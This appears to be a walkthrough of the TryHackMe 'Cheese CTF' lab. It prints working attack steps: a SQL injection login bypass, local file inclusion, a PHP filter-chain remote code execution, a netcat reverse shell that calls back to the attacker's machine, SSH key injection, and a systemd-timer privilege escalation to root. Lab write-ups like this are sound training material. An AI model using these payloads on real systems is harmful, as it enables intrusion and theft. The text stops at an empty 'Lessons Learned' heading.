# Cheese CTF – TryHackMe Walkthrough

## Overview
Cheese CTF is a Linux-based TryHackMe room that includes web enumeration, authentication bypass, local file inclusion, remote code execution, gaining user access, and privilege escalation to root.

## Objectives
- Gain initial access to the target
- Capture the user flag
- Escalate privileges to root
- Capture the root flag

## Tools Used
- Nmap
- ffuf
- curl
- php_filter_chain_generator
- netcat
- SSH
- MySQL
- systemctl
- xxd

## Target Information
- Target IP: `10.x.x.x`

## Walkthrough Sections
## 1. Reconnaissance
I started with an Nmap SYN scan against the target to identify open ports and potential services.

```bash
nmap -sS 10.x.x.x
```
<img width="531" height="319" alt="recon" src="https://github.com/user-attachments/assets/e6dcca80-6b30-4937-af8b-777dd4434adb" />

The scan reported a very large number of open ports. This suggested that the result might be noisy or intentionally misleading, so I decided not to focus on every reported service.

To continue enumeration, I shifted attention to the web application and browsed the target over HTTP. I also performed directory and file enumeration to identify exposed pages and interesting resources.
```bash
feroxbuster -u http://10.x.x.x -w /usr/share/dirb/wordlists/common.txt -x php,txt,html
```
<img width="1120" height="668" alt="enumeration" src="https://github.com/user-attachments/assets/959911d9-cd38-49fa-b162-74b1eeea88f8" />
Next, I visited the main page in the browser and found a visible Login link.

Opening the login page confirmed that the web application was likely the main attack surface for initial access.
<img width="879" height="662" alt="the_web_page" src="https://github.com/user-attachments/assets/0df413ff-3359-481e-9cbd-1e1e9b841926" />
<img width="538" height="365" alt="login_page" src="https://github.com/user-attachments/assets/878603e3-fe10-4dde-954d-8612277e3a4a" />


## 2. Login Bypass (SQL Injection)

After identifying `login.php` as the main entry point, I tested the login form for basic injection behavior. A simple single-quote test returned the normal login failure message, so I continued with more focused testing.

To identify unusual responses, I used `ffuf` with a SQL injection payload list against the `username` parameter.

```bash
ffuf -w /usr/share/seclists/Fuzzing/login_bypass.txt \
-u http://10.x.x.x/login.php \
-X POST \
-d "username=FUZZ&password=test" \
-H "Content-Type: application/x-www-form-urlencoded" \
-mc all
```

<img width="802" height="642" alt="ffuf-login-bypass-1" src="https://github.com/user-attachments/assets/c000d026-c96c-4cf5-b7c9-13c35819e1d5" />

Most responses returned the same status code and size, but a few payloads produced a different result. In particular, I observed 302 redirects, which suggested a successful authentication bypass.

One working payload was:
```
' OR 'x'='x'#;
```
<img width="708" height="28" alt="ffuf-login-bypass-2" src="https://github.com/user-attachments/assets/ca3a4915-5ffe-4f50-b5f5-af5a50ee0606" />

I entered that payload into the username field and used any value for the password.

- Username: ' OR 'x'='x'#;
- Password: test
<img width="473" height="321" alt="sqli-payload-login" src="https://github.com/user-attachments/assets/19ad244c-0d07-4acf-ba31-93dc80015379" />

This successfully bypassed authentication and redirected me into the application, confirming that the login form was vulnerable to SQL injection in the username field.

<img width="939" height="322" alt="post-login-redirect" src="https://github.com/user-attachments/assets/3a974e03-52fd-431b-ba84-29d3006abd8e" />

After the redirect, I landed on the admin panel page at:

`secret-script.php?file=supersecretadminpanel.html`

At first glance, the panel did not reveal much useful information. The visible sections were very minimal, and some pages appeared to contain little or no actionable content. For example, the **Users** page only displayed a simple heading, and the **Messages** area did not immediately expose anything obvious. This suggested that the real value was not in the page content itself, but in how the application was loading files through the `file=` parameter.


## 3. Local File Inclusion (LFI)

After bypassing the login page, I noticed that the application loaded content through the `file=` parameter in `secret-script.php`.

The URL looked like this:

```text
http://10.x.x.x/secret-script.php?file=supersecretadminpanel.html
```
Because the application was directly referencing files through a GET parameter, I tested for Local File Inclusion (LFI) by replacing the value with a path traversal sequence targeting /etc/passwd.
```text
http://10.x.x.x/secret-script.php?file=../../../../../../etc/passwd
```
<img width="1912" height="258" alt="lfi-etc-passwd" src="https://github.com/user-attachments/assets/230a0b5a-b200-4717-83b4-40881d36ca48" />

The application returned the contents of /etc/passwd, which confirmed that the file= parameter was vulnerable to Local File Inclusion.

This was an important finding because it meant I could read local files from the server and potentially inspect the source code of the vulnerable application.


## 4. Reading PHP Source Code

After confirming Local File Inclusion, I used the PHP stream wrapper `php://filter` to read the source code of the vulnerable script instead of executing it directly.

I requested the file through Base64 encoding:

```text
http://10.x.x.x/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php
```
<img width="1570" height="111" alt="php-filter-source-request" src="https://github.com/user-attachments/assets/f447075a-b442-4842-aea4-954cb62357f0" />

The server returned the Base64-encoded contents of secret-script.php, which I then decoded to inspect the source code.

<img width="1415" height="138" alt="decoded-secret-script-source" src="https://github.com/user-attachments/assets/de5d0956-e6bd-49bd-b1a5-a20a6e251063" />

The code showed that the application directly passed user-controlled input into include($file) without validation or sanitization. This confirmed that the file= parameter was not only vulnerable to file inclusion, but also a likely path toward remote code execution.


## 5. Remote Code Execution (RCE)

After reviewing the source code, I confirmed that the application used:

```php
include($file);
```
Because the file parameter was passed directly into include(), I explored whether the LFI could be turned into code execution.

A simple data:// wrapper test did not return command output, so I moved to a more advanced technique using php_filter_chain_generator, which can build a filter chain that results in PHP code execution through the vulnerable include() call.

I first cloned the tool and generated a test payload that would run the id command.

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator.git
cd php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
```
<img width="1897" height="583" alt="filter-chain-generator-id" src="https://github.com/user-attachments/assets/23f690ab-dbc1-4ccd-a8cf-f56fa987ed25" />

The tool returned a long php://filter/... payload. I then used that payload in a request to the vulnerable endpoint through the file parameter.

```bash
payload='php://filter/...'
curl -G --output - 'http://10.x.x.x/secret-script.php' \
  --data-urlencode "file=$payload"
```  

<img width="1908" height="390" alt="rce-id-output" src="https://github.com/user-attachments/assets/e2e0a306-4a56-4beb-8844-397d90271977" />

The response returned the result of the id command:

'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

This confirmed that I had achieved remote code execution on the target as the www-data user.


## 6. Reverse Shell

Once I confirmed command execution as `www-data`, I worked on turning that access into a more usable interactive shell.

I first started a Netcat listener on my attacking machine:

```bash
nc -lvnp 4444
```
Before generating the reverse shell payload, I checked my `tun0` interface to confirm the VPN IP address assigned by OpenVPN. This is important when using a local Kali machine instead of the TryHackMe AttackBox, because the reverse shell must connect back to the VPN-facing IP that the target can actually reach. Using the wrong local or NAT address would prevent the shell from connecting successfully.

```bash
ip a | grep tun0
```
<img width="783" height="61" alt="tun0" src="https://github.com/user-attachments/assets/8232eef6-d9f6-43e6-a096-856c1e954a6a" />

Then I generated another PHP filter chain payload, this time containing a reverse shell command. After a basic `nc -e` attempt failed, I switched to a FIFO-based reverse shell payload.

```bash
python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.x.x 4444 >/tmp/f"); ?>'
```
I sent the generated payload to the vulnerable endpoint using the same file parameter technique.

```bash
payload=$(python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.x.x 4444 >/tmp/f"); ?>' | tail -n 1)

curl -s -G 'http://10.x.x.x/secret-script.php' \
  --data-urlencode "file=$payload" > /dev/null
```
<img width="1476" height="78" alt="reverse-shell-trigger" src="https://github.com/user-attachments/assets/17aaaed3-5ca8-4570-93f8-f08c8196df81" />

The listener received a shell from the target:
<img width="564" height="91" alt="reverse-shell-listener" src="https://github.com/user-attachments/assets/61012960-a5d0-4add-aafe-01a5a432dc56" />

After landing the shell, I confirmed my access level and current working directory:

<img width="149" height="91" alt="whoami-pwd" src="https://github.com/user-attachments/assets/7434395a-7df4-4a6f-904a-d126a4c43d2a" />

The shell was running as www-data from /var/www/html, which gave me a stable foothold on the target and allowed me to continue local enumeration.


## 7. Credential Discovery

After gaining a shell as `www-data`, I began searching the web root for hardcoded credentials, secrets, and other useful strings that might help me pivot to a user account.

I used `grep` to recursively search for keywords such as `password`, `admin`, `secret`, and `token` within `/var/www/html`.

```bash
grep -Rni "pass\|password\|user\|admin\|secret\|token" /var/www/html 2>/dev/null
```
This revealed hardcoded database credentials inside login.php:
$user = "[REDACTED]";
$password = "[REDACTED]";
<img width="1303" height="486" alt="grep-webroot-credentials" src="https://github.com/user-attachments/assets/dab41ed2-6397-43d1-8cca-2c53752c5797" />

It also revealed additional interesting references, including:

- secret-script.php

- supersecretadminpanel.html

- supersecretmessageforadmin

These findings suggested that the application stored sensitive information directly in the source code and that the credentials might be useful for further access.

I also manually reviewed the discovered output and noted that the credentials appeared to belong to the backend database connection rather than directly to the Linux user account.

Although these credentials did not immediately work for `su`, they provided a strong lead for pivoting further into the system.

## 8. User Access via SSH Key Injection

Since direct access to the `[REDACTED]` user was still not available, I continued enumerating the home directories and SSH-related files.

I found that `/home/[REDACTED]/.ssh/authorized_keys` was world-writable, which created a direct path to user access.

```bash
ls -ld /home/[REDACTED]/.ssh /home/ubuntu/.ssh
ls -l /home/[REDACTED]/.ssh /home/ubuntu/.ssh
find /home -name authorized_keys -ls 2>/dev/null
```
<img width="859" height="165" alt="ssh-directory-enumeration" src="https://github.com/user-attachments/assets/727c7701-cfc8-4fd8-a6b3-3544e61a0266" />

The output showed that `/home/[REDACTED]/.ssh/authorized_keys` was world-writable (`-rw-rw-rw-`), which meant I could add my own public key and gain SSH access as the `[REDACTED]` user. In contrast, `/home/ubuntu/.ssh` was not accessible and did not appear to be the correct path.

On my attacking machine, I generated a new SSH key pair:

```bash
ssh-keygen -t rsa -b 4096 -f cheese_key -N ""
cat cheese_key.pub
```

<img width="1905" height="408" alt="generate-ssh-key" src="https://github.com/user-attachments/assets/0e0d4831-9fd0-46db-933f-04a8052760f8" />

Then, from the remote shell as `www-data`, I appended my public key to `/home/[REDACTED]/.ssh/authorized_keys:`

```bash
echo 'ssh-rsa AAAA... kali@kali' >> /home/[REDACTED]/.ssh/authorized_keys
tail -n 1 /home/[REDACTED]/.ssh/authorized_keys
``` 
<img width="1899" height="143" alt="append-authorized-key" src="https://github.com/user-attachments/assets/2e107eec-2b82-4a67-b31a-0c9079291be2" />

After that, I connected over SSH using the private key I had generated:

```bash
ssh -i cheese_key [REDACTED]@10.x.x.x
```

This gave me shell access as the `[REDACTED]` user without needing to know the account password.

<img width="686" height="718" alt="ssh-login-user" src="https://github.com/user-attachments/assets/86280bae-7d87-4bc5-8e14-5ed52d18f121" />


## 9. User Flag

After injecting my SSH public key and authenticating successfully, I gained shell access as the `comte` user.

To confirm the session and capture the user flag, I ran:

```bash
whoami
ls
cat user.txt
```
<img width="416" height="581" alt="username-user-shell" src="https://github.com/user-attachments/assets/29828ddf-e0c8-49bd-8381-ae0165edec26" />

The output confirmed that I was logged in as `[REDACTED]`, and I was able to read the user flag from the home directory.
```text
THM{9f2ce3df1beeecaf...redacted}
```

## 10. Privilege Escalation to Root

After obtaining access as `[REDACTED]`, I checked the user's `sudo` privileges to identify possible privilege escalation paths.

```bash
sudo -l
```
<img width="514" height="105" alt="sudo-l-output" src="https://github.com/user-attachments/assets/5ddbf7f0-6a02-4567-8fdd-78b77973285b" />

The output showed that `[REDACTED]` could run the following commands without a password:

`- /bin/systemctl daemon-reload`

`- /bin/systemctl restart exploit.timer`

`- /bin/systemctl start exploit.timer`

`- /bin/systemctl enable exploit.timer`

This suggested that a systemd timer and service were involved in the escalation path, so I inspected both unit files.

```bash
systemctl cat exploit.timer
systemctl cat exploit.service
cat /etc/systemd/system/exploit.timer
cat /etc/systemd/system/exploit.service
```
<img width="705" height="552" alt="systemctl-cat-exploit-units" src="https://github.com/user-attachments/assets/8ea8dff8-e907-482f-83ae-6cff1d225ab2" />

The service file showed the following command:

`ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"`

This meant that if the service ran successfully as root, it would copy xxd to /opt/xxd and set the SUID bit on it.

However, the timer was broken because OnBootSec= was empty. I checked the permissions of the unit files and found that exploit.timer was world-writable.

```bash
ls -l /etc/systemd/system/exploit.timer /etc/systemd/system/exploit.service
```
<img width="833" height="51" alt="exploit-timer-permissions" src="https://github.com/user-attachments/assets/ed6d3207-19b3-472d-ad97-0d4082284b95" />

I modified exploit.timer to include a valid timer configuration:

```bash
cat > /etc/systemd/system/exploit.timer << 'EOF'
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=1sec
Unit=exploit.service

[Install]
WantedBy=timers.target
EOF
```
Then I reloaded systemd and started the timer:
```bash
sudo systemctl daemon-reload
sudo systemctl start exploit.timer
sleep 2
ls -l /opt/xxd
```
<img width="510" height="87" alt="trigger-exploit-timer" src="https://github.com/user-attachments/assets/f9b8a3cd-0e2f-4b74-ba05-b9b74d1999db" />

This created /opt/xxd as a SUID binary owned by root.


## 11. Root Flag

After starting the fixed timer, the service created `/opt/xxd` as a SUID binary owned by root.

I verified the file permissions:

```bash
ls -l /opt/xxd
```
<img width="418" height="39" alt="ls-opt-xxd" src="https://github.com/user-attachments/assets/859b77d1-fb78-4373-aefa-dbf183dd44f5" />

Then I used xxd to read the root flag from `/root/root.txt` and convert it back to plain text:

```bash
/opt/xxd /root/root.txt | /opt/xxd -r
```
<img width="523" height="151" alt="root-flag-xxd" src="https://github.com/user-attachments/assets/d12c2004-f815-4f2c-85a7-915dd817973d" />

This allowed me to read the root flag without needing a full interactive root shell.

```text
THM{{dca75486094810807fa...redacted}

12. Lessons Learned
